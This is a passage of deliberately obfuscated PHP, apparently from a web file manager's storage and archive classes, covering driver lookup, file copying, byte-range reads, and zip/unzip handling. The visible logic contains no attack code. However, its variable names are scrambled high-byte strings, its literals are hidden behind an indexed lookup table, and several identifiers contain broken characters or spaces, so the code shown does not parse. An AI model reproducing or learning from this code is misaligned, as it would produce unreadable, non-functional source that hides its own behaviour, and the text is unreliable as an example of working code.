($È€’äÄ == 0 && $™ƒĞéâ <= $Æ†¾ÀŒê[$È€’äÄ]) { $™ƒĞéâ = $Æ†¾ÀŒê[$È€’äÄ]; break; } else { if ($™ƒĞéâ > $Æ†¾ÀŒê[$È€’äÄ - 1] && $™ƒĞéâ <= $Æ†¾ÀŒê[$È€’äÄ]) { $™ƒĞéâ = $Æ†¾ÀŒê[$È€’äÄ]; break; } else { if ($È€’äÄ == count($Æ†¾ÀŒê) - 1 && $™ƒĞéâ > $Æ†¾ÀŒê[$È€’äÄ]) { $™ƒĞéâ = $Æ†¾ÀŒê[$È€’äÄ]; break; } } } } $¹Ÿâôª¸ = self::driverMake($²ìŞ”’‡); if ($¹Ÿâôª¸->isFileOutServer()) { return $¹Ÿâôª¸->fileOutImageServer($²ìŞ”’‡, $™ƒĞéâ); } return $¹Ÿâôª¸->fileOutImage($²ìŞ”’‡, $™ƒĞéâ); } private static function driverIsSame($ç§“», $áº€ç²÷) { $‡İêÆ„Í =& $_SERVER[ •ŒÓîÆ]; $™•©ÓúÙ = $ç§“»->getType(); $ĞèâŞ½Ø = $áº€ç²÷->getType(); if ($™•©ÓúÙ != $ĞèâŞ½Ø) { return !1; } if ($™•©ÓúÙ == $‡İêÆ„Í[798]) { return !0; } if ($™•©ÓúÙ == $‡İêÆ„Í[108]) { return !0; } if ($ç§“»->pathDriver == $áº€ç²÷->pathDriver) { return !0; } return !1; } public static function copyUpdate($•¶Óî”, $‘¾‚øŸÒ) { $•¿âá¥Á =& $_SERVER[ •ŒÓîÆ]; if (!IO::exist($•¶Óî”)) { return !1; } if (!IO::exist($‘¾‚øŸÒ)) { IO::mkdir($‘¾‚øŸÒ); } $‹¹“ßÃÖ = array_to_keyvalue(self::listAllSimple($•¶Óî”), $•¿âá¥Á[86]); $°ˆÍƒ›ª = array_to_keyvalue(self::listAllSimple($‘¾‚øŸÒ), $•¿âá¥Á[86]); $ßŒ¯ÎÎ = array(); $­ÁÜé½ç = array(); foreach ($‹¹“ßÃÖ as $Š·Íèº => $ÜËã£²´) { if (isset($°ˆÍƒ›ª[$Š·Íèº])) { if ($ÜËã£²´[$•¿âá¥Á[77]] == 1) { continue; } if ($°ˆÍƒ›ª[$Š·Íèº][$•¿âá¥Á[78]] == $ÜËã£²´[$•¿âá¥Á[78]]) { continue; } } if ($ÜËã£²´[$•¿âá¥Á[77]] == 1) { $­ÁÜé½ç[] = $‘¾‚øŸÒ . $•¿âá¥Á[8] . trim($Š·Íèº, $•¿âá¥Á[8]); continue; } $Š™½ó‹„ = strstr(trim($Š·Íèº, $•¿âá¥Á[8]), $•¿âá¥Á[8]) ? get_path_father($Š·Íèº) : $•¿âá¥Á[12]; $ßŒ¯ÎÎ[] = array($•¿âá¥Á[1201] => $ÜËã£²´[$•¿âá¥Á[88]], $•¿âá¥Á[1202] => rtrim($‘¾‚øŸÒ, $•¿âá¥Á[8]) . $•¿âá¥Á[8] . $Š™½ó‹„, $•¿âá¥Á[1203] => $ÜËã£²´); } $Ãˆ®­Å¼ = array($•¿âá¥Á[216] => $ßŒ¯ÎÎ, $•¿âá¥Á[77] => $­ÁÜé½ç); Hook::trigger($•¿âá¥Á[1204], $•¶Óî”, $‘¾‚øŸÒ, $Ãˆ®­Å¼); foreach ($­ÁÜé½ç as $ÜËã£²´) { IO::mkdir($ÜËã£²´); } foreach ($ßŒ¯ÎÎ as $ÜËã£²´) { IO::copy($ÜËã£²´[$•¿âá¥Á[1201]], $ÜËã£²´[$•¿âá¥Á[1202]], REPEAT_REPLACE); } } public static function fileSubstr($˜­èÃôØ, $ÅÍ³ªò¾, $¤ş¾ıá = false) { $ôşÙ‡´¥ =& $_SERVER[ •ŒÓîÆ]; $é«Äà = self::driverMake($˜­èÃôØ); $¡Ôíõ†á = $é«Äà->size($˜­èÃôØ); $Á–‡—Æ“ = $ÅÍ³ªò¾; $¿ÈœŠ— = $¤ş¾ıá; if ($ÅÍ³ªò¾ < 0) { $ÅÍ³ªò¾ = $¡Ôíõ†á + $ÅÍ³ªò¾; } if ($¤ş¾ıá === !1) { $¤ş¾ıá = $¡Ôíõ†á - $ÅÍ³ªò¾; } if ($ÅÍ³ªò¾ + $¤ş¾ıá > $¡Ôíõ†á) { $¤ş¾ıá = $¡Ôíõ†á - $ÅÍ³ªò¾; } if (!$¡Ôíõ†á && $é«Äà->getType() == $ôşÙ‡´¥[108] && !$é«Äà->exist($˜­èÃôØ)) { $êˆÉ¸ò = get_path_this($˜­èÃôØ); $ÖûÏâı¨ = parse_url_query($êˆÉ¸ò); if (is_array($ÖûÏâı¨) && isset($ÖûÏâı¨[$ôşÙ‡´¥[32]])) { $êˆÉ¸ò = urldecode($ÖûÏâı¨[$ôşÙ‡´¥[32]]); } throw new Exception($ôşÙ‡´¥[1205] . LNG($ôşÙ‡´¥[1206]) . $ôşÙ‡´¥[1007] . clear_html($êˆÉ¸ò) . $ôşÙ‡´¥[12]); } if ($¤ş¾ıá <= 0) { return $ôşÙ‡´¥[12]; } if ($ÅÍ³ªò¾ < 0 || $ÅÍ³ªò¾ >= $¡Ôíõ†á || $¤ş¾ıá > 1024 * 1024 * 10) { throw new Exception("\146\x69\x6c\x65\x52\x65\141\x64\40\145\162\162\157\x72\41\40\x73\164\141\162\x74\75{$ÅÍ³ªò¾}\73\154\145\156\147\164\x68\75{$¤ş¾ıá}\x3b\40\x73\x69\172\x65\x3d{$¡Ôíõ†á}\x3b"); } $¿”Ä÷Ûê = $é«Äà->fileSubstr($˜­èÃôØ, $ÅÍ³ªò¾, $¤ş¾ıá); if (!$¿”Ä÷Ûê && $¤ş¾ıá && isset($GLOBALS[$ôşÙ‡´¥[1207]])) { throw new Exception($GLOBALS[$ôşÙ‡´¥[1207]][$ôşÙ‡´¥[1208]]); } return $¿”Ä÷Ûê; } private static function driverMake(&$•™±“†) { $¢Âì±“Û =& $_SERVER[ •ŒÓîÆ]; $ËÛ—è§ = KodIO::parse($•™±“†); if (!self::$driverListSystem) { $•Ôúˆ¤ = Model($¢Âì±“Û[808])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($•Ôúˆ¤, $¢Âì±“Û[453]); } if ($ËÛ—è§[$¢Âì±“Û[33]] == KodIO::KOD_IO && !self::$driverListSystem[$ËÛ—è§[$¢Âì±“Û[453]]]) { return !1; } $•™±“† = $ËÛ—è§[$¢Âì±“Û[1209]]; $¢¢¡ÖŠı = self::driverGet($ËÛ—è§, $•™±“†); return $¢¢¡ÖŠı; } private static function driverGet($ò˜ı«, &$òŞŞÀ¨‹) { $ÊñûËú‚ =& $_SERVER[ •ŒÓîÆ]; $„ãšê¬ = $ò˜ı«[$ÊñûËú‚[1210]]; $Ï¥¿Ë†µ = $ò˜ı«[$ÊñûËú‚[453]]; switch ($ò˜ı«[$ÊñûËú‚[33]]) { case KodIO::KOD_IO: $¯˜ùµÔ‚ = self::$driverListSystem[$Ï¥¿Ë†µ]; break; case KodIO::KOD_SOURCE: $òŞŞÀ¨‹ = $Ï¥¿Ë†µ . $òŞŞÀ¨‹; $¯˜ùµÔ‚ = array($ÊñûËú‚[1211] => $ÊñûËú‚[1212], $ÊñûËú‚[6] => $ò˜ı«); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $„·ÂÃŸÇ = $GLOBALS[$ÊñûËú‚[1213]]; self::$driverListUser = array_to_keyvalue($„·ÂÃŸÇ, $ÊñûËú‚[453]); } $¯˜ùµÔ‚ = self::$driverListUser[$Ï¥¿Ë†µ]; break; case KodIO::KOD_SHARE_LINK: $¯˜ùµÔ‚ = array($ÊñûËú‚[1211] => $ÊñûËú‚[1214], $ÊñûËú‚[6] => $ò˜ı«); $Å”“„œƒ = Action($ÊñûËú‚[1215])->sharePathInfo($ò˜ı«[$ÊñûËú‚[86]]); $òŞŞÀ¨‹ = $Å”“„œƒ[$ÊñûËú‚[183]]; if (!$Å”“„œƒ[$ÊñûËú‚[183]]) { $×Àß”‹ = Model($ÊñûËú‚[644])->getInfo($Å”“„œƒ[$ÊñûËú‚[645]]); $òŞŞÀ¨‹ = KodIO::clear($×Àß”‹[$ÊñûËú‚[1216]] . $ò˜ı«[$ÊñûËú‚[1209]]); $ò˜ı«[$ÊñûËú‚[540]] = $×Àß”‹; $ò˜ı«[$ÊñûËú‚[1192]] = $òŞŞÀ¨‹; $¯˜ùµÔ‚ = array($ÊñûËú‚[1211] => $ÊñûËú‚[1217], $ÊñûËú‚[6] => $ò˜ı«); } break; case KodIO::KOD_SHARE_ITEM: $¯˜ùµÔ‚ = array($ÊñûËú‚[1211] => $ÊñûËú‚[1218], $ÊñûËú‚[6] => $ò˜ı«); $×Àß”‹ = Model($ÊñûËú‚[644])->getInfo($ò˜ı«[$ÊñûËú‚[453]]); if ($×Àß”‹[$ÊñûËú‚[183]] == $ÊñûËú‚[214]) { $òŞŞÀ¨‹ = KodIO::clear($×Àß”‹[$ÊñûËú‚[1216]] . $ò˜ı«[$ÊñûËú‚[1209]]); $ò˜ı«[$ÊñûËú‚[540]] = $×Àß”‹; $ò˜ı«[$ÊñûËú‚[1192]] = $òŞŞÀ¨‹; $¯˜ùµÔ‚ = array($ÊñûËú‚[1211] => $ÊñûËú‚[1219], $ÊñûËú‚[6] => $ò˜ı«); } else { if (!$òŞŞÀ¨‹) { $òŞŞÀ¨‹ = $×Àß”‹[$ÊñûËú‚[183]]; } } break; default: $òŞŞÀ¨‹ = $ò˜ı«[$ÊñûËú‚[86]]; $¯˜ùµÔ‚ = array($ÊñûËú‚[1211] => $ÊñûËú‚[1220]); break; } $ ‰ñ˜ƒê = $ò˜ı«[$ÊñûËú‚[86]]; if (!isset(self::$driverCache[$ ‰ñ˜ƒê])) { $¿ªØî³á = strtolower($¯˜ùµÔ‚[$ÊñûËú‚[97]]); $íÏ…¬ˆÚ = $GLOBALS[$ÊñûËú‚[6]][$ÊñûËú‚[91]][$ÊñûËú‚[867]]; $“”–†ªê = $ÊñûËú‚[76] . (isset($íÏ…¬ˆÚ[$¿ªØî³á]) ? $íÏ…¬ˆÚ[$¿ªØî³á] : ucfirst($¿ªØî³á)); if (!class_exists($“”–†ªê)) { show_json("{$“”–†ªê}\x20\x6e\x6f\x74\x20\x65\170\x69\x73\x74\163\41", !1); } $Õ¦ÏÖ¡£ = isset($¯˜ùµÔ‚[$ÊñûËú‚[6]]) ? $¯˜ùµÔ‚[$ÊñûËú‚[6]] : !1; self::$driverCache[$ ‰ñ˜ƒê] = new $“”–†ªê($Õ¦ÏÖ¡£); } $¼èî“°† = self::$driverCache[$ ‰ñ˜ƒê]; $¼èî“°†->pathDriver = $„ãšê¬; $¼èî“°†->pathBase = $ÊñûËú‚[12]; if (isset($¯˜ùµÔ‚[$ÊñûËú‚[6]][$ÊñûËú‚[1221]])) { $¼èî“°†->pathBase = rtrim($¯˜ùµÔ‚[$ÊñûËú‚[6]][$ÊñûËú‚[1221]], $ÊñûËú‚[8]) . $ÊñûËú‚[8]; $òŞŞÀ¨‹ = $¼èî“°†->pathBase . ltrim($òŞŞÀ¨‹, $ÊñûËú‚[8]); } $òŞŞÀ¨‹ = $¼èî“°†->getPath($òŞŞÀ¨‹); if (isset($ò˜ı«[$ÊñûËú‚[1192]])) { $òŞŞÀ¨‹ = $ò˜ı«[$ÊñûËú‚[1192]]; } $¼èî“°†->path = $òŞŞÀ¨‹; return $¼èî“°†; } public static function errorTips($“á ¢Á« = false) { $Ğ‡ÀÕ‡Ö =& $_SERVER[ •ŒÓîÆ]; static $¿ÍÌ¶² = array(); $Ë®Ÿ¶éü = 1000; if ($“á ¢Á« === -1) { return $¿ÍÌ¶² ? $¿ÍÌ¶²[count($¿ÍÌ¶²) - 1] : $Ğ‡ÀÕ‡Ö[12]; } if ($“á ¢Á« === !1) { return implode($Ğ‡ÀÕ‡Ö[248], $¿ÍÌ¶²); } if (count($¿ÍÌ¶²) >= $Ë®Ÿ¶éü) { $¿ÍÌ¶² = array_slice($¿ÍÌ¶², $Ë®Ÿ¶éü * 0.5, $Ë®Ÿ¶éü); } $¿ÍÌ¶²[] = $“á ¢Á«; write_log($Ğ‡ÀÕ‡Ö[165] . ACTION . $Ğ‡ÀÕ‡Ö[1222] . $“á ¢Á«, $Ğ‡ÀÕ‡Ö[1223]); } public static function getLastError($¥ÚÊÜÛõ = '') { $ÛõØà© = self::errorTips(-1); return $ÛõØà© ? $ÛõØà© : $¥ÚÊÜÛõ; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $“´à®û’; if ($“´à®û’) { return $“´à®û’; } $Å¥»©Û¨ = IO::init($_SERVER[ •ŒÓîÆ][8]); return $Å¥»©Û¨; } private static function iconvSystem($¡ƒˆ„…é) { return self::local()->iconvSystem($¡ƒˆ„…é); } private static function iconvApp($‚³’…Ù¦) { return self::local()->iconvApp($‚³’…Ù¦); } public static function zipFolder($ÛÇ”ë–¿, $¢å¶®Íˆ = "\172\x69\x70", $óˆÖ¢²Õ = '', $Š¢¤·‰ = REPEAT_RENAME) { $Úñì¹à =& $_SERVER[ •ŒÓîÆ]; $©¥œÈÛç = IO::listPath($ÛÇ”ë–¿); if (!$©¥œÈÛç) { return !1; } $©¥œÈÛç = array_merge($©¥œÈÛç[$Úñì¹à[84]], $©¥œÈÛç[$Úñì¹à[85]]); return self::zip($©¥œÈÛç, $¢å¶®Íˆ, $óˆÖ¢²Õ, $Š¢¤·‰); } public static function zip($¯çÏãéü, $£îÅ†—ô = "\172\x69\x70", $ãı¡–° = '', $İË£Îå = REPEAT_RENAME) { $â‚Àß‘Ä =& $_SERVER[ •ŒÓîÆ]; if (is_string($¯çÏãéü) && $¯çÏãéü) { $¯çÏãéü = array(array($â‚Àß‘Ä[86] => $¯çÏãéü)); } $²©††”ª = self::init($¯çÏãéü[0][$â‚Àß‘Ä[86]]); $ñ³ñ©Ÿõ = self::info($¯çÏãéü[0][$â‚Àß‘Ä[86]]); $ø™ª†€ = $â‚Àß‘Ä[12]; $¬ã¾¼È = $â‚Àß‘Ä[12]; $İëæ£±¸ = $â‚Àß‘Ä[12]; if ($ãı¡–° && substr($ãı¡–°, -1, 1) != $â‚Àß‘Ä[8]) { $¬ã¾¼È = get_path_father($ãı¡–°); $İëæ£±¸ = get_path_this($ãı¡–°); } else { $¬ã¾¼È = self::pathFather($ñ³ñ©Ÿõ[$â‚Àß‘Ä[86]]); $İëæ£±¸ = $ñ³ñ©Ÿõ[$â‚Àß‘Ä[32]] . $â‚Àß‘Ä[10] . $£îÅ†—ô; if (count($¯çÏãéü) > 1) { $úôØªü™ = IO::info($¬ã¾¼È); $İëæ£±¸ = $úôØªü™[$â‚Àß‘Ä[32]] . $â‚Àß‘Ä[10] . $£îÅ†—ô; } if ($ãı¡–°) { $¬ã¾¼È = $ãı¡–°; } } if ($²©††”ª->getType() == $â‚Àß‘Ä[108]) { $õ²±¦ö = self::init($¬ã¾¼È); $¾©ÛóÂ = $õ²±¦ö->getType() == $â‚Àß‘Ä[108] ? $¬ã¾¼È : get_path_father($²©††”ª->path); $¾©ÛóÂ = rtrim($¾©ÛóÂ, $â‚Àß‘Ä[8]) . $â‚Àß‘Ä[8]; mk_dir($¾©ÛóÂ); } else { $ø™ª†€ = TEMP_FILES . $â‚Àß‘Ä[1224] . time() . rand_string(8) . $â‚Àß‘Ä[8]; mk_dir($ø™ª†€); file_put_contents($ø™ª†€ . $â‚Àß‘Ä[1225], $â‚Àß‘Ä[12]); $¾©ÛóÂ = $ø™ª†€; } $†üğ³ ã = IO::info($¾©ÛóÂ); if (!$†üğ³ ã || !$†üğ³ ã[$â‚Àß‘Ä[219]]) { show_json(LNG($â‚Àß‘Ä[1226]), !1); } $½›®ºº˜ = self::zipFileList($¯çÏãéü, $ø™ª†€); foreach ($½›®ºº˜ as $Ÿ×øå¯¼ => $¶‘Î‘ßÙ) { $½›®ºº˜[$Ÿ×øå¯¼] = self::iconvSystem($¶‘Î‘ßÙ); } $½˜‡ŠÄ = get_filename_auto($¾©ÛóÂ . $İëæ£±¸, $â‚Àß‘Ä[12], $İË£Îå); KodArchive::create(self::iconvSystem($½˜‡ŠÄ), $½›®ºº˜); if (!IO::exist($½˜‡ŠÄ)) { if ($ø™ª†€) { del_dir($ø™ª†€); } show_json(LNG($â‚Àß‘Ä[1227]), !1); } if (!$ø™ª†€) { return $½˜‡ŠÄ; } $ôœ¹î = self::move($½˜‡ŠÄ, $¬ã¾¼È, $İË£Îå); if ($ø™ª†€) { del_dir($ø™ª†€); } if (!$½˜‡ŠÄ) { show_json(LNG($â‚Àß‘Ä[1227]), !1); } return $ôœ¹î; } public static function unzip($öŠª ëÉ, $³Ù£µ¿„, $™ï‚Ş¦Ğ = "\55\61", $ÅÄùé¨ª = "\x72\145\160\154\x61\143\145") { $‹¯Ô²¤Ê =& $_SERVER[ •ŒÓîÆ]; $À¤Ó–àª = parent::info($öŠª ëÉ); if (!$À¤Ó–àª) { show_json(LNG($‹¯Ô²¤Ê[1228]), !1); } $ôÑ†á½‹ = IO::infoFullSimple($³Ù£µ¿„); if (!$ôÑ†á½‹) { $³Ù£µ¿„ = IO::mkdir($³Ù£µ¿„); } if (isset($ôÑ†á½‹[$‹¯Ô²¤Ê[183]]) && trim($ôÑ†á½‹[$‹¯Ô²¤Ê[86]], $‹¯Ô²¤Ê[8]) != trim($³Ù£µ¿„, $‹¯Ô²¤Ê[8])) { $¹ÓíÓí = KodIO::make($ôÑ†á½‹[$‹¯Ô²¤Ê[182]]); $ßõÄ±¼Ù = IO::fileNameAuto($¹ÓíÓí, $ôÑ†á½‹[$‹¯Ô²¤Ê[32]], REPEAT_RENAME_FOLDER, !0); $³Ù£µ¿„ = IO::mkdir($¹ÓíÓí . $ßõÄ±¼Ù); } $™ï‚Ş¦Ğ = $™ï‚Ş¦Ğ && $™ï‚Ş¦Ğ != $‹¯Ô²¤Ê[1229] ? @json_decode($™ï‚Ş¦Ğ, !0) : -1; $ˆÚ¡ËÅ = self::unzipPart($öŠª ëÉ, $™ï‚Ş¦Ğ); if (!$ˆÚ¡ËÅ || !IO::exist($ˆÚ¡ËÅ[$‹¯Ô²¤Ê[216]])) { show_json(LNG($‹¯Ô²¤Ê[107]), !1); } $©¥´¦ô = $ˆÚ¡ËÅ[$‹¯Ô²¤Ê[1230]][count($ˆÚ¡ËÅ[$‹¯Ô²¤Ê[1230]]) - 1]; if ($©¥´¦ô[$‹¯Ô²¤Ê[1231]] == -1 || substr($©¥´¦ô[$‹¯Ô²¤Ê[32]], -1, 1) == $‹¯Ô²¤Ê[8]) { $ì¿¶‹Ú = $ˆÚ¡ËÅ[$‹¯Ô²¤Ê[1232]] . rand_string(10) . $‹¯Ô²¤Ê[8]; mk_dir($ì¿¶‹Ú); $¸ùÔñ“ˆ = count($ˆÚ¡ËÅ[$‹¯Ô²¤Ê[1230]]) == 1 ? IO::ext($öŠª ëÉ) : get_path_ext($ˆÚ¡ËÅ[$‹¯Ô²¤Ê[216]]); $Û×ß¢ºÔ = KodArchive::extract(self::iconvSystem($ˆÚ¡ËÅ[$‹¯Ô²¤Ê[216]]), $ì¿¶‹Ú, $©¥´¦ô[$‹¯Ô²¤Ê[1231]], $ßõÄ±¼Ù, $¸ùÔñ“ˆ); self::unzipErrorCheck($Û×ß¢ºÔ, array($‹¯Ô²¤Ê[1233], $öŠª ëÉ, $¸ùÔñ“ˆ, $³Ù£µ¿„, $ˆÚ¡ËÅ)); Hook::trigger($‹¯Ô²¤Ê[1234], $ì¿¶‹Ú); recursion_dir($ì¿¶‹Ú, $ú¡ş§, $»àçÓÈı, 0); $½¬«ûçÇ = array_merge($ú¡ş§, $»àçÓÈı); $ëîÌ¬³Ë = array(); foreach ($½¬«ûçÇ as $ƒØ¡£µŸ) { $À•™ò¸‹ = IO::move(self::iconvApp($ƒØ¡£µŸ), $³Ù£µ¿„, $ÅÄùé¨ª); if ($À•™ò¸‹) { $ëîÌ¬³Ë[] = $À•™ò¸‹; } } del_dir($ì¿¶‹Ú); } else { $À•™ò¸‹ = IO::move($ˆÚ¡ËÅ[$‹¯Ô²¤Ê[216]], $³Ù£µ¿„, $ÅÄùé¨ª, get_path_this($©¥´¦ô[$‹¯Ô²¤Ê[32]])); if ($À•™ò¸‹) { $ëîÌ¬³Ë[] = $À•™ò¸‹; } } return $ëîÌ¬³Ë ? $ëîÌ¬³Ë : !1; } public static function unzipList($İÖô®á´) { $˜•§”¤¶ =& $_SERVER[ •ŒÓîÆ]; $ÖƒÛø‹ = isset($İÖô®á´[$˜•§”¤¶[1235]]) ? $İÖô®á´[$˜•§”¤¶[1235]] : !1; $èµ’Åñª = isset($İÖô®á´[$˜•§”¤¶[1231]]) ? @json_decode($İÖô®á´[$˜•§”¤¶[1231]], !0) : -1; $Í¹Ó¶Î¶ = self::unzipPart($İÖô®á´[$˜•§”¤¶[86]], $èµ’Åñª); if (!$Í¹Ó¶Î¶ || !IO::exist($Í¹Ó¶Î¶[$˜•§”¤¶[216]])) { show_json(LNG($˜•§”¤¶[107]), !1); } $¾Å³†á = $Í¹Ó¶Î¶[$˜•§”¤¶[1230]][count($Í¹Ó¶Î¶[$˜•§”¤¶[1230]]) - 1]; $™˜³¥Û = in_array(IO::ext($Í¹Ó¶Î¶[$˜•§”¤¶[216]]), array($˜•§”¤¶[368], $˜•§”¤¶[1236], $˜•§”¤¶[1237], $˜•§”¤¶[1238], $˜•§”¤¶[1239], $˜•§”¤¶[1240])); if (!$ÖƒÛø‹ && ($¾Å³†á[$˜•§”¤¶[1231]] == -1 || $™˜³¥Û)) { $°àÏèÌı = $Í¹Ó¶Î¶[$˜•§”¤¶[1232]] . get_path_this($Í¹Ó¶Î¶[$˜•§”¤¶[216]]) . $˜•§”¤¶[1241]; if (!IO::exist($°àÏèÌı)) { $³ß“îÃ = $¾Å³†á[$˜•§”¤¶[1231]] == -1 ? get_path_ext(IO::pathThis($İÖô®á´[$˜•§”¤¶[86]])) : get_path_ext($Í¹Ó¶Î¶[$˜•§”¤¶[216]]); $š»íî°Ï = KodArchive::listContent(self::iconvSystem($Í¹Ó¶Î¶[$˜•§”¤¶[216]]), !0, $³ß“îÃ); self::unzipErrorCheck($š»íî°Ï, array($˜•§”¤¶[1242], $İÖô®á´, $Í¹Ó¶Î¶)); @file_put_contents($°àÏèÌı, json_encode($š»íî°Ï[$˜•§”¤¶[1243]])); } return @json_decode(IO::getContent($°àÏèÌı), !0); } IO::fileOut($Í¹Ó¶Î¶[$˜•§”¤¶[216]], $ÖƒÛø‹, get_path_this($¾Å³†á[$˜•§”¤¶[32]])); die; } private static function zipFileList($ÎÌ³òƒ, $ÎŠ– Èó = false) { $ôøŒ÷™Ğ =& $_SERVER[ •ŒÓîÆ]; $‘¬æØí´ = array(); foreach ($ÎÌ³òƒ as $†„œûï) { $¾¦ëáÌ = $†„œûï[$ôøŒ÷™Ğ[86]]; if ($ÎŠ– Èó) { $¾¦ëáÌ = self::copy($†„œûï[$ôøŒ÷™Ğ[86]], $ÎŠ– Èó, $ôøŒ÷™Ğ[859]); } else { $´‰Åá•ş = self::init($†„œûï[$ôøŒ÷™Ğ[86]]); if ($´‰Åá•ş->getType() == $ôøŒ÷™Ğ[108]) { $¾¦ëáÌ = $´‰Åá•ş->path; } } if ($¾¦ëáÌ && self::local()->exist($¾¦ëáÌ)) { $‘¬æØí´[$†„œûï[$ôøŒ÷™Ğ[86]]] = $¾¦ëáÌ; } } if (!empty($‘¬æØí´)) { return array_values($‘¬æØí´); } show_json(LNG($ôøŒ÷™Ğ[1206]), !1); } private static function localFilePath($¨ã†„—ß) { $Êôßşş½ =& $_SERVER[ •ŒÓîÆ]; $´¤´²Ã³ = KodIO::parse($¨ã†„—ß); if ($´¤´²Ã³[$Êôßşş½[33]] == KodIO::KOD_SOURCE) { $Ö±æ§Äâ = Model($Êôßşş½[866])->fileInfoGet(KodIO::sourceID($¨ã†„—ß)); if (!$Ö±æ§Äâ[$Êôßşş½[86]]) { show_json($Êôßşş½[1244], !1); } $¨ã†„—ß = $Ö±æ§Äâ[$Êôßşş½[86]]; } $µ×Úİœ‘ = self::init($¨ã†„—ß); if ($µ×Úİœ‘->pathParse[$Êôßşş½[1192]]) { $¨ã†„—ß = $µ×Úİœ‘->pathParse[$Êôßşş½[1192]]; $µ×Úİœ‘ = self::init($¨ã†„—ß); } $Êõ¤…£ = $µ×Úİœ‘->getType(); if ($Êõ¤…£ == $Êôßşş½[108] || $Êõ¤…£ == $Êôßşş½[1245]) { if (!$µ×Úİœ‘->exist($µ×Úİœ‘->path)) { show_json(LNG($Êôßşş½[107]), !1); } return $µ×Úİœ‘->path; } return !1; } public static function unzipPart($Ì›æÀıÚ, $‰”¨ş˜İ = -1) { $¯ª·Òåª =& $_SERVER[ •ŒÓîÆ]; $‰¥ª Ê = IO::pathThis($Ì›æÀıÚ); if (!$‰”¨ş˜İ || $‰”¨ş˜İ == -1) { $ıÓ¢²ˆ = array(array($¯ª·Òåª[32] => $‰¥ª Ê, $¯ª·Òåª[1231] => -1)); $ıÓ¢²ˆ[0][$¯ª·Òåª[1246]] = $ıÓ¢²ˆ[0][$¯ª·Òåª[32]]; } else { if (is_array($‰”¨ş˜İ)) { $ıÓ¢²ˆ = $‰”¨ş˜İ; $¤±àÄíğ = count($ıÓ¢²ˆ) - 1; for ($“©¯‚í = 0; $“©¯‚í <= $¤±àÄíğ; $“©¯‚í++) { $ÑÊ¿ê…¦ = $ıÓ¢²ˆ[$“©¯‚í]; $Ú¯Í®‰¢ = get_path_this($ÑÊ¿ê…¦[$¯ª·Òåª[32]]) . (checkExtSafe($ÑÊ¿ê…¦[$¯ª·Òåª[32]]) ? $¯ª·Òåª[12] : $¯ª·Òåª[1247]); $ıÓ¢²ˆ[$“©¯‚í][$¯ª·Òåª[1246]] = $¯ª·Òåª[1248] . intval($ÑÊ¿ê…¦[$¯ª·Òåª[1231]]) . $¯ª·Òåª[440] . $Ú¯Í®‰¢; if ($“©¯‚í == 0) { continue; } $ıÓ¢²ˆ[$“©¯‚í][$¯ª·Òåª[1246]] = $ıÓ¢²ˆ[$“©¯‚í - 1][$¯ª·Òåª[1246]] . $¯ª·Òåª[1249] . $ıÓ¢²ˆ[$“©¯‚í][$¯ª·Òåª[1246]]; } } } if (!is_array($ıÓ¢²ˆ) || count($ıÓ¢²ˆ) == 0) { return !1; } $½œãô©º = $ıÓ¢²ˆ[count($ıÓ¢²ˆ) - 1]; if (!IO::exist($Ì›æÀıÚ)) { return !1; } $»—æë…ı = TEMP_FILES . $¯ª·Òåª[1250] . kodIO::hashPathSafe($Ì›æÀıÚ) . $¯ª·Òåª[8]; $‹ÍÚ † = $»—æë…ı . $½œãô©º[$¯ª·Òåª[1246]]; mk_dir($»—æë…ı); file_put_contents(TEMP_FILES . $¯ª·Òåª[1225], $¯ª·Òåª[12]); if (IO::exist($‹ÍÚ †)) { return array($¯ª·Òåª[216] => $‹ÍÚ †, $¯ª·Òåª[1230] => $ıÓ¢²ˆ, $¯ª·Òåª[1232] => $»—æë…ı); } $ÔøÒüîš = self::localFilePath($Ì›æÀıÚ); if (!$ÔøÒüîš) { $ÔøÒüîš = $»—æë…ı . $¯ª·Òåª[1251]; if (!IO::exist($ÔøÒüîš)) { self::copy($Ì›æÀıÚ, $»—æë…ı, !1, get_path_this($ÔøÒüîš)); } } if (!$ÔøÒüîš || !IO::exist($ÔøÒüîš)) { return !1; } if ($½œãô©º[$¯ª·Òåª[1231]] == -1) { return array($¯ª·Òåª[216] => $ÔøÒüîš, $¯ª·Òåª[1230] => $ıÓ¢²ˆ, $¯ª·Òåª[1232] => $»—æë…ı); } $‹µğ¹Ê’ = $ÔøÒüîš; foreach ($ıÓ¢²ˆ as $“©¯‚í => $ÑÊ¿ê…¦) { if (!$ÑÊ¿ê…¦ || $ÑÊ¿ê…¦[$¯ª·Òåª[1231]] == $¯ª·Òåª[1229]) { break; } if (substr($ÑÊ¿ê…¦[$¯ª·Òåª[32]], -1, 1) == $¯ª·Òåª[8]) { break; } $½ÍšÎİ = in_array(get_path_ext($ÑÊ¿ê…¦[$¯ª·Òåª[1246]]), array($¯ª·Òåª[368], $¯ª·Òåª[1236], $¯ª·Òåª[1237], $¯ª·Òåª[1238], $¯ª·Òåª[1239], $¯ª·Òåª[1240])); $ä¶íî = $“©¯‚í == count($ıÓ¢²ˆ) - 1 && $½ÍšÎİ; $¸®¶½åµ = $»—æë…ı . $ÑÊ¿ê…¦[$¯ª·Òåª[1246]]; $¤Áßøª = $»—æë…ı . get_path_this($ÑÊ¿ê…¦[$¯ª·Òåª[32]]); if (IO::exist($¸®¶½åµ)) { $‹µğ¹Ê’ = $¸®¶½åµ; continue; } $¸Ô—‘ŞŞ = $“©¯‚í == 0 ? get_path_ext($‰¥ª Ê) : get_path_ext($‹µğ¹Ê’); $ù„ßÊû’ = KodArchive::extract(self::iconvSystem($‹µğ¹Ê’), $»—æë…ı, $ÑÊ¿ê…¦[$¯ª·Òåª[1231]], $‚´ïğ‰, $¸Ô—‘ŞŞ); self::unzipErrorCheck($ù„ßÊû’, array($¯ª·Òåª[1252], $Ì›æÀıÚ, $ıÓ¢²ˆ, $ÑÊ¿ê…¦, $¸®¶½åµ)); if (IO::exist($¤Áßøª)) { IO::rename($¤Áßøª, get_path_this($¸®¶½åµ)); } $‹µğ¹Ê’ = $¸®¶½åµ; } $‹ÍÚ † = $‹µğ¹Ê’; return array($¯ª·Òåª[216] => $‹µğ¹Ê’, $¯ª·Òåª[1230] => $ıÓ¢²ˆ, $¯ª·Òåª[1232] => $»—æë…ı); } private static function unzipErrorCheck($®¸÷½Œ¦, $¤Úë‘ÎÚ = false) { $¡Ñùà…µ =& $_SERVER[ •ŒÓîÆ]; if 